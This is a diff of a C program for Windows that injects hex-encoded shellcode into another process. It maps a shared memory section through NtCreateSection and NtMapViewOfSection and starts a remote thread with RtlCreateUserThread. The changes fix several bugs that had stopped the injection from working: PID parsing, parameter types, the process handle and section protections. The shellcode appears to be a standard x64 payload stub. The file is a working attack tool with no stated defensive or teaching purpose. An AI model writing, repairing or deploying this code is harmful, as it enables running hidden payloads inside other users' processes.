@@ -33,11 +33,11 @@ typedef NTSTATUS (NTAPI* NtCreateSection)(
 typedef NTSTATUS (NTAPI* NtMapViewOfSection)(
     IN HANDLE SectionHandle,
     IN HANDLE ProcessHandle,
-    IN OUT PVOID* BaseAddress,
+    PVOID* BaseAddress,
     IN ULONG_PTR ZeroBits,
     IN SIZE_T CommitSize,
-    IN OUT PLARGE_INTEGER SectionOffset OPTIONAL,
-    IN OUT SIZE_T ViewSize,
+    PLARGE_INTEGER SectionOffset OPTIONAL,
+    PSIZE_T ViewSize,
     IN DWORD InheritDisposition,
     IN ULONG AllocationType,
     IN ULONG Win32Protect
@@ -68,7 +68,9 @@ int main(int argc, char *argv[]) {
         exit(0);
     }
 
-    unsigned char buf[] =                                               // Shell Code
+    int target_pid = atoi(argv[1]);
+
+    unsigned char buf[] =
         "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
         "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
         "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
@@ -108,25 +110,26 @@ int main(int argc, char *argv[]) {
     RtlCreateUserThread pRtlCreateUserThread = (RtlCreateUserThread)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlCreateUserThread"));
 
     HANDLE section_handle;
-    LARGE_INTEGER section_size;
+    SIZE_T view_size = 4096;
+    LARGE_INTEGER section_size = { view_size };
     
-    pNtCreateSection(&section_handle, SECTION_ALL_ACCESS, NULL, &section_size, PAGE_READWRITE, SEC_COMMIT, NULL);
+    pNtCreateSection(&section_handle, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER)&section_size, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
 
     PVOID local_section_address = NULL;
-    SIZE_T view_size = 1024 * 1024;
 
-    pNtMapViewOfSection(section_handle, GetCurrentProcess(), &local_section_address, NULL, NULL, NULL, view_size, 2, NULL, PAGE_READWRITE);          // Local Section
+    pNtMapViewOfSection(section_handle, GetCurrentProcess(), &local_section_address, NULL, NULL, NULL, &view_size, 2, NULL, PAGE_READWRITE);          // Local Section
 
-    HANDLE target_process_handle = OpenProcess(PROCESS_ALL_ACCESS, false, (DWORD)argv[1]);
+    HANDLE target_process_handle = OpenProcess(PROCESS_ALL_ACCESS, false, target_pid);
     PVOID remote_section_address = NULL;
 
-    pNtMapViewOfSection(section_handle, target_process_handle, &remote_section_address, NULL, NULL, NULL, view_size, 2, NULL, PAGE_EXECUTE_READ);              // Remote Section
+    pNtMapViewOfSection(section_handle, target_process_handle, &remote_section_address, NULL, NULL, NULL, &view_size, 2, NULL, PAGE_EXECUTE_READ);              // Remote Section
 
     memcpy(local_section_address, buf, sizeof(buf));
 
     HANDLE target_handle = NULL;
 
-    pRtlCreateUserThread(target_handle, NULL, FALSE, 0, 0, 0, remote_section_address, NULL, &target_handle, NULL);
+    pRtlCreateUserThread(target_process_handle, NULL, FALSE, 0, 0, 0, remote_section_address, NULL, &target_handle, NULL);
 
     return 0;
 }
+
